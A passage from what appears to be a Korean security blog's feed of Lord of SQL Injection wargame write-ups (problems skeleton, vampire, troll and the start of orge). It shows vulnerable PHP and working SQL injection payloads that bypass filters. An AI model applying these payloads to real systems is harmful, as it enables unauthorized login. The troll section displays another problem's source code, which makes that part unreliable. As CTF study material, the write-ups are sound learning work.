and pw='&#123;$_GET[pw]&#125;' and 1=0"</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;hr&gt;query : &lt;strong&gt;&#123;$query&#125;&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;"</span>;</span><br><span class="line">  $result = @mysql_fetch_array(mysql_query($query));</span><br><span class="line">  <span class="keyword">if</span>($result[<span class="string">'id'</span>] == <span class="string">'admin'</span>) solve(<span class="string">"skeleton"</span>);</span><br><span class="line">  highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="Filter"><a href="#Filter" class="headerlink" title="Filter"></a>Filter</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/prob|_|\.|\(\)/i'</span>, $_GET[pw])) <span class="keyword">exit</span>(<span class="string">"No Hack ~_~"</span>);</span><br></pre></td></tr></table></figure><ul><li>GET방식으로 <code>pw</code>를 받고, <code>pw</code>에 <code>prob</code>, <code>_</code>, <code>.</code>, <code>()</code> 가 들어 있으면 <code>No Hack ~_~</code>이 뜨고 문제 풀이에 실패한다.</li></ul><h4 id="Query"><a href="#Query" class="headerlink" title="Query"></a>Query</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$query = <span class="string">"select id from prob_skeleton where id='guest' and pw='&#123;$_GET[pw]&#125;' and 1=0"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;hr&gt;query : &lt;strong&gt;&#123;$query&#125;&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;"</span>;</span><br><span class="line">$result = @mysql_fetch_array(mysql_query($query));</span><br><span class="line"><span class="keyword">if</span>($result[<span class="string">'id'</span>] == <span class="string">'admin'</span>) solve(<span class="string">"skeleton"</span>);</span><br></pre></td></tr></table></figure><ul><li>받은 <code>id</code>가 직접 쿼리에 들어간다. 이것으로 SQL Injection 공격이 가능하다는 것을 알 수 있다.</li><li>문제 풀이가 성공하는 조건은 ‘데이터베이스에서 받은 <code>id</code>에 <code>&quot;admin&quot;</code>이라는 값이 들어있음’이다.</li></ul><h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><ol><li><p>주석 처리 이용</p><p>MySQL에서는 <code>#</code>, <code>-- -</code>와 같은 주석문자에 이어져 나오는 문자열을 모두 무시한다.</p><p>따라서 입력값으로 <code>&#39; or id=&#39;admin&#39;%23</code>, <code>&#39; or id=&#39;admin&#39;-- -</code> 과 같이 마지막에 주석을 넣은 값을 넣으면 삽입된 문자열까지만 처리하여 문제가 풀리게 된다.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://los.eagle-jump.org/skeleton_8d9cbfe1efbd44cfbbdc63fa605e5f1b.php?pw=&apos; or id=&apos;admin&apos;%23</span><br></pre></td></tr></table></figure><p>URL Encoding 후 공백은 %20, #은 %23, ‘는 %27이 된다.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://los.eagle-jump.org/skeleton_8d9cbfe1efbd44cfbbdc63fa605e5f1b.php?pw=&apos; or id=&apos;admin&apos;-- -</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">id</span> <span class="keyword">from</span> prob_skeleton <span class="keyword">where</span> <span class="keyword">id</span>=<span class="string">'guest'</span> <span class="keyword">and</span> pw=<span class="string">''</span> <span class="keyword">or</span> <span class="keyword">id</span>=<span class="string">'admin'</span><span class="comment">#' and 1=0</span></span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">id</span> <span class="keyword">from</span> prob_skeleton <span class="keyword">where</span> <span class="keyword">id</span>=<span class="string">'guest'</span> <span class="keyword">and</span> pw=<span class="string">''</span> <span class="keyword">or</span> <span class="keyword">id</span>=<span class="string">'admin'</span><span class="comment">-- -' and 1=0</span></span><br></pre></td></tr></table></figure></li><li><p>논리 연산 우선순위 이용</p><p>MySQL에서 WHERE절의 논리 연산같은 경우 AND연산이 OR연산보다 우선 처리된다.</p><p>따라서 입력값으로 <code>&#39; or id=&#39;admin&#39; or &#39;1&#39;=&#39;1</code> 과 같은 값을 넣으면 <code>id=&#39;guest&#39;</code>인 행의 <code>pw</code>가 빈 문자열이 아닌 경우 논리 연산 후 결국 <code>id=&#39;admin&#39;</code>인 행을 불러오는 SQL문이 되어 문제가 풀리게 된다.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://los.eagle-jump.org/skeleton_8d9cbfe1efbd44cfbbdc63fa605e5f1b.php?pw=&apos; or id=&apos;admin&apos; or &apos;1&apos;=&apos;1</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">id</span> <span class="keyword">from</span> prob_skeleton <span class="keyword">where</span> <span class="keyword">id</span>=<span class="string">'guest'</span> <span class="keyword">and</span> pw=<span class="string">''</span> <span class="keyword">or</span> <span class="keyword">id</span>=<span class="string">'admin'</span> <span class="keyword">or</span> <span class="string">'1'</span>=<span class="string">'1'</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">0</span></span><br></pre></td></tr></table></figure></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;개요&quot;&gt;&lt;a href=&quot;#개요&quot; class=&quot;headerlink&quot; title=&quot;개요&quot;&gt;&lt;/a&gt;개요&lt;/h2&gt;&lt;img src=&quot;/image/los-main.png&quot; width=&quot;300&quot;&gt;

&lt;p&gt;SQL Injection에 대한 지식을 쌓기 위해 &lt;a href=&quot;https://los.eagle-jump.org/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Lord of SQL Injection 사이트&lt;/a&gt;의 문제를 풀고 해답을 정리한다.&lt;/p&gt;
&lt;p&gt;이 문서에서는 Lord of SQL Injection 10번 skeleton 문제에 대하여 정리한다.&lt;/p&gt;
    
    </summary>
    
      <category term="Write Up" scheme="https://www.jslee.me/categories/Write-Up/"/>
    
    
      <category term="Lord of SQL Injection" scheme="https://www.jslee.me/tags/Lord-of-SQL-Injection/"/>
    
      <category term="Infosec" scheme="https://www.jslee.me/tags/Infosec/"/>
    
  </entry>
  
  <entry>
    <title>Lord of SQL Injection Write Up No.9 Vampire</title>
    <link href="https://www.jslee.me/2019/08/20/los-write-up-09-vampire/"/>
    <id>https://www.jslee.me/2019/08/20/los-write-up-09-vampire/</id>
    <published>2019-08-20T10:48:27.000Z</published>
    <updated>2019-08-20T11:08:10.063Z</updated>
    
    <content type="html"><![CDATA[<h2 id="개요"><a href="#개요" class="headerlink" title="개요"></a>개요</h2><img src="/image/los-main.png" width="300"><p>SQL Injection에 대한 지식을 쌓기 위해 <a href="https://los.eagle-jump.org/" target="_blank" rel="noopener">Lord of SQL Injection 사이트</a>의 문제를 풀고 해답을 정리한다.</p><p>이 문서에서는 Lord of SQL Injection 9번 vampire 문제에 대하여 정리한다.</p><a id="more"></a><h2 id="문제-분석"><a href="#문제-분석" class="headerlink" title="문제 분석"></a>문제 분석</h2><h3 id="문제-출제-의도"><a href="#문제-출제-의도" class="headerlink" title="문제 출제 의도"></a>문제 출제 의도</h3><p><code>admin</code>을 빈 문자열로 교체하는 <code>str_replace()</code> 함수를 우회하여 <code>id</code>값으로 <code>admin</code>을 전달할 수 있는지 확인한다.</p><h3 id="필요-배경-지식"><a href="#필요-배경-지식" class="headerlink" title="필요 배경 지식"></a>필요 배경 지식</h3><h4 id="MySQL-대소문자-구별"><a href="#MySQL-대소문자-구별" class="headerlink" title="MySQL 대소문자 구별"></a>MySQL 대소문자 구별</h4><ul><li>MySQL은 기본적으로 대소문자 구별을 하지 않는다.</li><li>MySQL의 대소문자 구별에 대한 자세한 내용을 알고 싶다면 다음 링크를 참고하자.</li><li><a href="https://zetawiki.com/wiki/MySQL_%EB%8C%80%EC%86%8C%EB%AC%B8%EC%9E%90_%EA%B5%AC%EB%B3%84" target="_blank" rel="noopener">MySQL 대소문자 구별 - 제타위키</a></li></ul><h4 id="str-replace"><a href="#str-replace" class="headerlink" title="str_replace"></a>str_replace</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mixed str_replace ( mixed $search , mixed $replace , mixed $subject [, int &amp;$count ] )</span><br></pre></td></tr></table></figure><ul><li><code>str_replace</code> 함수는 문자열에서 <strong>대소문자를 구분하여</strong> 문자열 교체를 수행한다.</li><li>반환값은 치환이 완료된 문자열이다.</li><li>php의 <code>str_replace</code> 함수에 대해 잘 모르겠다면 다음 링크를 참고하자.</li><li><a href="http://php.net/manual/kr/function.str-replace.php" target="_blank" rel="noopener">PHP: str_replace - Manual</a></li></ul><h3 id="소스-코드-분석"><a href="#소스-코드-분석" class="headerlink" title="소스 코드 분석"></a>소스 코드 분석</h3><p>vampire 문제의 php 소스 코드는 다음과 같다.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">include</span> <span class="string">"./config.php"</span>;</span><br><span class="line">  login_chk();</span><br><span class="line">  dbconnect();</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">'/\'/i'</span>, $_GET[id])) <span class="keyword">exit</span>(<span class="string">"No Hack ~_~"</span>);</span><br><span class="line">  $_GET[id] = str_replace(<span class="string">"admin"</span>,<span class="string">""</span>,$_GET[id]);</span><br><span class="line">  $query = <span class="string">"select id from prob_vampire where id='&#123;$_GET[id]&#125;'"</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;hr&gt;query : &lt;strong&gt;&#123;$query&#125;&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;"</span>;</span><br><span class="line">  $result = @mysql_fetch_array(mysql_query($query));</span><br><span class="line">  <span class="keyword">if</span>($result[<span class="string">'id'</span>] == <span class="string">'admin'</span>) solve(<span class="string">"vampire"</span>);</span><br><span class="line">  highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="Filter"><a href="#Filter" class="headerlink" title="Filter"></a>Filter</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/\'/i'</span>, $_GET[id])) <span class="keyword">exit</span>(<span class="string">"No Hack ~_~"</span>);</span><br><span class="line">$_GET[id] = str_replace(<span class="string">"admin"</span>,<span class="string">""</span>,$_GET[id]);</span><br></pre></td></tr></table></figure><ul><li>GET 방식으로 <code>id</code>를 받고, <code>id</code>에 <code>&#39;</code> 가 들어 있으면 <code>No Hack ~_~</code>이 뜨고 문제 풀이에 실패한다.</li><li>또한, <code>id</code>에 <strong>대소문자 구분 하여</strong> <code>admin</code> 이 들어 있으면 빈 문자열로 교체되고 sql문에 삽입된다.</li></ul><h4 id="Query"><a href="#Query" class="headerlink" title="Query"></a>Query</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$query = <span class="string">"select id from prob_vampire where id='&#123;$_GET[id]&#125;'"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;hr&gt;query : &lt;strong&gt;&#123;$query&#125;&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;"</span>;</span><br><span class="line">$result = @mysql_fetch_array(mysql_query($query));</span><br><span class="line"><span class="keyword">if</span>($result[<span class="string">'id'</span>] == <span class="string">'admin'</span>) solve(<span class="string">"vampire"</span>);</span><br></pre></td></tr></table></figure><ul><li>받은 <code>id</code>가 직접 쿼리에 들어간다. 이것으로 SQL Injection 공격이 가능하다는 것을 알 수 있다.</li><li>문제 풀이가 성공하는 조건은 ‘데이터베이스에서 받은 <code>id</code>에 <code>&quot;admin&quot;</code>이라는 값이 들어있음’이다.</li></ul><h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><ol><li><p>대소문자 구분 이용</p><p>PHP의 <code>str_replace</code> 함수 부분을 보면</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/\'/i'</span>, $_GET[id])) <span class="keyword">exit</span>(<span class="string">"No Hack ~_~"</span>);</span><br></pre></td></tr></table></figure><p>치환될 대상 문자열로 <code>&quot;admin&quot;</code> 을 전달하는 것을 알 수 있다.<br><code>str_replace()</code> 함수는 대소문자를 구분하기 때문에, 이런 경우 <code>admin</code> 이라는 문자열만 치환하게 된다.</p><p>그러나 기본적으로 MySQL에서는 대소문자를 구분하지 않는다.<br>따라서 입력값으로 <code>Admin</code>, <code>ADMIN</code> 과 같이 대문자를 섞은 값을 넣으면 <code>str_replace()</code> 함수에서 필터링이 이루어지지 않아 문제가 풀리게 된다.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://los.eagle-jump.org/vampire_0538b0259b6680c1ca4631a388177ed4.php?id=ADMIN</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">id</span> <span class="keyword">from</span> prob_vampire <span class="keyword">where</span> <span class="keyword">id</span>=<span class="string">'ADMIN'</span></span><br></pre></td></tr></table></figure></li><li><p><code>str_replace</code> 작동 후 완성되는 문자열 이용</p><p>PHP의 str_replace 함수 부분을 보면</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/\'/i'</span>, $_GET[id])) <span class="keyword">exit</span>(<span class="string">"No Hack ~_~"</span>);</span><br></pre></td></tr></table></figure><p>대상 문자열 <code>&quot;admin&quot;</code> 을 빈 문자열로 치환하는 것을 알 수 있다.<br><code>str_replace()</code> 함수는 1회 작동 후 종료되기 때문에, 이런 경우 <code>admin</code> 이라는 문자열이 한 번만 빈 문자열로 치환되게 된다.<br>따라서 입력값으로 <code>adadminmin</code> 과 같이 <code>str_replace</code> 작동 후 <code>admin</code>이 되는 값을 넣으면 <code>admin</code>이 삽입되어 문제가 풀리게 된다.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://los.eagle-jump.org/vampire_0538b0259b6680c1ca4631a388177ed4.php?id=adadminmin</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">id</span> <span class="keyword">from</span> prob_vampire <span class="keyword">where</span> <span class="keyword">id</span>=<span class="string">'admin'</span></span><br></pre></td></tr></table></figure></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;개요&quot;&gt;&lt;a href=&quot;#개요&quot; class=&quot;headerlink&quot; title=&quot;개요&quot;&gt;&lt;/a&gt;개요&lt;/h2&gt;&lt;img src=&quot;/image/los-main.png&quot; width=&quot;300&quot;&gt;

&lt;p&gt;SQL Injection에 대한 지식을 쌓기 위해 &lt;a href=&quot;https://los.eagle-jump.org/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Lord of SQL Injection 사이트&lt;/a&gt;의 문제를 풀고 해답을 정리한다.&lt;/p&gt;
&lt;p&gt;이 문서에서는 Lord of SQL Injection 9번 vampire 문제에 대하여 정리한다.&lt;/p&gt;
    
    </summary>
    
      <category term="Write Up" scheme="https://www.jslee.me/categories/Write-Up/"/>
    
    
      <category term="Lord of SQL Injection" scheme="https://www.jslee.me/tags/Lord-of-SQL-Injection/"/>
    
      <category term="Infosec" scheme="https://www.jslee.me/tags/Infosec/"/>
    
  </entry>
  
  <entry>
    <title>Lord of SQL Injection Write Up No.8 Troll</title>
    <link href="https://www.jslee.me/2019/08/19/los-write-up-08-troll/"/>
    <id>https://www.jslee.me/2019/08/19/los-write-up-08-troll/</id>
    <published>2019-08-19T11:21:10.000Z</published>
    <updated>2019-08-20T11:08:10.063Z</updated>
    
    <content type="html"><![CDATA[<h2 id="개요"><a href="#개요" class="headerlink" title="개요"></a>개요</h2><img src="/image/los-main.png" width="300"><p>SQL Injection에 대한 지식을 쌓기 위해 <a href="https://los.eagle-jump.org/" target="_blank" rel="noopener">Lord of SQL Injection 사이트</a>의 문제를 풀고 해답을 정리한다.</p><p>이 문서에서는 Lord of SQL Injection 8번 troll 문제에 대하여 정리한다.</p><a id="more"></a><h2 id="문제-분석"><a href="#문제-분석" class="headerlink" title="문제 분석"></a>문제 분석</h2><h3 id="문제-출제-의도"><a href="#문제-출제-의도" class="headerlink" title="문제 출제 의도"></a>문제 출제 의도</h3><p><code>admin</code>을 필터링하는 <code>ereg()</code> 함수를 우회하여 <code>id</code>값으로 <code>admin</code>을 전달할 수 있는지 확인한다.</p><h3 id="필요-배경-지식"><a href="#필요-배경-지식" class="headerlink" title="필요 배경 지식"></a>필요 배경 지식</h3><h4 id="ereg"><a href="#ereg" class="headerlink" title="ereg"></a>ereg</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">int ereg ( string $pattern , string $string [, <span class="keyword">array</span> &amp;$regs ] )</span><br></pre></td></tr></table></figure><ul><li><code>ereg</code> 함수는 문자열에서 <strong>대소문자를 구분하여</strong> 정규표현식 매치를 수행한다.</li><li>반환값은 매치된 문자열의 길이 또는 <code>FALSE</code> 이다.</li><li>php의 <code>ereg</code> 함수에 대해 잘 모르겠다면 다음 링크를 참고하자.</li><li><a href="http://php.net/manual/kr/function.ereg.php" target="_blank" rel="noopener">PHP: ereg - Manual</a></li></ul><h4 id="MySQL-대소문자-구별"><a href="#MySQL-대소문자-구별" class="headerlink" title="MySQL 대소문자 구별"></a>MySQL 대소문자 구별</h4><ul><li>MySQL은 기본적으로 대소문자 구별을 하지 않는다.</li><li>MySQL의 대소문자 구별에 대한 자세한 내용을 알고 싶다면 다음 링크를 참고하자.</li><li><a href="https://zetawiki.com/wiki/MySQL_%EB%8C%80%EC%86%8C%EB%AC%B8%EC%9E%90_%EA%B5%AC%EB%B3%84" target="_blank" rel="noopener">MySQL 대소문자 구별 - 제타위키</a></li></ul><h3 id="소스-코드-분석"><a href="#소스-코드-분석" class="headerlink" title="소스 코드 분석"></a>소스 코드 분석</h3><p>goblin 문제의 php 소스 코드는 다음과 같다.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">include</span> <span class="string">"./config.php"</span>;</span><br><span class="line">  login_chk();</span><br><span class="line">  dbconnect();</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">'/prob|_|\.|\(\)/i'</span>, $_GET[no])) <span class="keyword">exit</span>(<span class="string">"No Hack ~_~"</span>);</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">'/\'|\"|\`/i'</span>, $_GET[no])) <span class="keyword">exit</span>(<span class="string">"No Quotes ~_~"</span>);</span><br><span class="line">  $query = <span class="string">"select id from prob_goblin where id='guest' and no=&#123;$_GET[no]&#125;"</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;hr&gt;query : &lt;strong&gt;&#123;$query&#125;&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;"</span>;</span><br><span class="line">  $result = @mysql_fetch_array(mysql_query($query));</span><br><span class="line">  <span class="keyword">if</span>($result[<span class="string">'id'</span>]) <span class="keyword">echo</span> <span class="string">"&lt;h2&gt;Hello &#123;$result[id]&#125;&lt;/h2&gt;"</span>;</span><br><span class="line">  <span class="keyword">if</span>($result[<span class="string">'id'</span>] == <span class="string">'admin'</span>) solve(<span class="string">"goblin"</span>);</span><br><span class="line">  highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="Filter"><a href="#Filter" class="headerlink" title="Filter"></a>Filter</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/prob|_|\.|\(\)/i'</span>, $_GET[no])) <span class="keyword">exit</span>(<span class="string">"No Hack ~_~"</span>);</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/\'|\"|\`/i'</span>, $_GET[no])) <span class="keyword">exit</span>(<span class="string">"No Quotes ~_~"</span>);</span><br></pre></td></tr></table></figure><ul><li>GET 방식으로 <code>no</code>를 받고, <code>no</code>에 <code>prob</code>, <code>_</code>, <code>.</code>, <code>()</code> 가 들어 있으면 <code>No Hack ~_~</code>이 뜨고 문제 풀이에 실패한다.</li><li>또한, <code>no</code>에 <code>&#39;</code>, <code>&quot;</code>, ` 가 들어 있으면 <code>No Quotes ~_~</code>가 뜨고 문제 풀이에 실패한다.</li></ul><h4 id="Query"><a href="#Query" class="headerlink" title="Query"></a>Query</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$query = <span class="string">"select id from prob_goblin where id='guest' and no=&#123;$_GET[no]&#125;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;hr&gt;query : &lt;strong&gt;&#123;$query&#125;&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;"</span>;</span><br><span class="line">$result = @mysql_fetch_array(mysql_query($query));</span><br><span class="line"><span class="keyword">if</span>($result[<span class="string">'id'</span>]) <span class="keyword">echo</span> <span class="string">"&lt;h2&gt;Hello &#123;$result[id]&#125;&lt;/h2&gt;"</span>;</span><br><span class="line"><span class="keyword">if</span>($result[<span class="string">'id'</span>] == <span class="string">'admin'</span>) solve(<span class="string">"goblin"</span>);</span><br></pre></td></tr></table></figure><ul><li>받은 <code>no</code>가 직접 쿼리에 들어간다. 이것으로 SQL Injection 공격이 가능하다는 것을 알 수 있다.</li><li>문제 풀이가 성공하는 조건은 ‘데이터베이스에서 받은 <code>id</code>에 <code>&quot;admin&quot;</code>이라는 값이 들어있음’이다.</li></ul><h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><ol><li><p>대소문자 구분 이용</p><p>PHP의 <code>ereg()</code> 함수 부분을 보면</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(@ereg(<span class="string">"admin"</span>,$_GET[id])) <span class="keyword">exit</span>(<span class="string">"HeHe"</span>);</span><br></pre></td></tr></table></figure><p>정규 표현식으로 <code>&quot;admin&quot;</code> 을 전달하는 것을 알 수 있다.<br><code>ereg()</code> 함수는 대소문자를 구분하기 때문에, 이런 경우 <code>admin</code> 이라는 문자열만 매치하게 된다.</p><p>그러나 기본적으로 MySQL에서는 대소문자를 구분하지 않는다.<br>따라서 입력값으로 <code>Admin</code>, <code>ADMIN</code> 과 같이 대문자를 섞은 값을 넣으면 <code>ereg()</code> 함수에서 필터링이 이루어지지 않아 문제가 풀리게 된다.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://los.eagle-jump.org/troll_6d1f080fa30a07dbaf7342285ba0e158.php?id=ADMIN</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">id</span> <span class="keyword">from</span> prob_troll <span class="keyword">where</span> <span class="keyword">id</span>=<span class="string">'ADMIN'</span></span><br></pre></td></tr></table></figure></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;개요&quot;&gt;&lt;a href=&quot;#개요&quot; class=&quot;headerlink&quot; title=&quot;개요&quot;&gt;&lt;/a&gt;개요&lt;/h2&gt;&lt;img src=&quot;/image/los-main.png&quot; width=&quot;300&quot;&gt;

&lt;p&gt;SQL Injection에 대한 지식을 쌓기 위해 &lt;a href=&quot;https://los.eagle-jump.org/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Lord of SQL Injection 사이트&lt;/a&gt;의 문제를 풀고 해답을 정리한다.&lt;/p&gt;
&lt;p&gt;이 문서에서는 Lord of SQL Injection 8번 troll 문제에 대하여 정리한다.&lt;/p&gt;
    
    </summary>
    
      <category term="Write Up" scheme="https://www.jslee.me/categories/Write-Up/"/>
    
    
      <category term="Lord of SQL Injection" scheme="https://www.jslee.me/tags/Lord-of-SQL-Injection/"/>
    
      <category term="Infosec" scheme="https://www.jslee.me/tags/Infosec/"/>
    
  </entry>
  
  <entry>
    <title>Lord of SQL Injection Write Up No.7 Orge</title>
    <link href="https://www.jslee.me/2019/08/18/los-write-up-07-orge/"/>
    <id>https://www.jslee.me/2019/08/18/los-write-up-07-orge/</id>
    <published>2019-08-17T17:10:31.000Z</published>
    <updated>2019-08-20T11:08:10.063Z</updated>
    
    <content type="html"><![CDATA[<h2 id="개요"><a href="#개요" class="headerlink" title="개요"></a>개요</h2><img src="/image/los-main.png" width="300"><p>SQL Injection에 대한 지식을 쌓기 위해 <a href="https://los.eagle-jump.org/" target="_blank" rel="noopener">Lord of SQL Injection 사이트</a>의 문제를 풀고 해답을 정리한다.</p><p>이 문서에서는 Lord of SQL Injection 7번 orge 문제에 대하여 정리한다.</p><a id="more"></a><h2 id="문제-분석"><a href="#문제-분석" class="headerlink" title="문제 분석"></a>문제 분석</h2><h3 id="문제-출제-의도"><a href="#문제-출제-의도" class="headerlink" title="문제 출제 의도"></a>문제 출제 의도</h3><p><code>OR</code>, <code>AND</code>를 사용하지 않고 Blind SQL Injection을 수행하여 원하는 문자열을 얻어낼 수 있는지 확인한다.<br>또는 <code>UNION</code> 구문과 <code>LIMIT</code>을 이용하여 원하는 문자열을 얻어낼 수 있는지 확인한다.</p><h3 id="소스-코드-분석"><a href="#소스-코드-분석" class="headerlink" title="소스 코드 분석"></a>소스 코드 분석</h3><p>orge 문제의 php 소스 코드는 다음과 같다.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">include</span> <span class="string">"./config.php"</span>;</span><br><span class="line">  login_chk();</span><br><span class="line">  dbconnect();</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">'/prob|_|\.|\(\)/i'</span>, $_GET[pw])) <span class="keyword">exit</span>(<span class="string">"No Hack ~_~"</span>);</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">'/or|and/i'</span>, $_GET[pw])) <span class="keyword">exit</span>(<span class="string">"HeHe"</span>);</span><br><span class="line">  $query = <span class="string">"select id from prob_orge where id='guest' and pw='&#123;$_GET[pw]&#125;'"</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;hr&gt;query : &lt;strong&gt;&#123;$query&#125;&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;"</span>;</span><br><span class="line">  $result = @mysql_fetch_array(mysql_query($query));</span><br><span class="line">  <span class="keyword">if</span>($result[<span class="string">'id'</span>]) <span class="keyword">echo</span> <span class="string">"&lt;h2&gt;Hello &#123;$result[id]&#125;&lt;/h2&gt;"</span>;</span><br><span class="line"></span><br><span class="line">  $_GET[pw] = addslashes($_GET[pw]);</span><br><span class="line">  $query = <span class="string">"select pw from prob_orge where id='admin' and pw='&#123;$_GET[pw]&#125;'"</span>;</span><br><span class="line">  $result = @mysql_fetch_array(mysql_query($query));</span><br><span class="line">  <span class="keyword">if</span>(($result[<span class="string">'pw'</span>]) &amp;&amp; ($result[<span class="string">'pw'</span>] == $_GET[<span class="string">'pw'</span>])) solve(<span class="string">"orge"</span>);</span><br><span class="line">  highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span 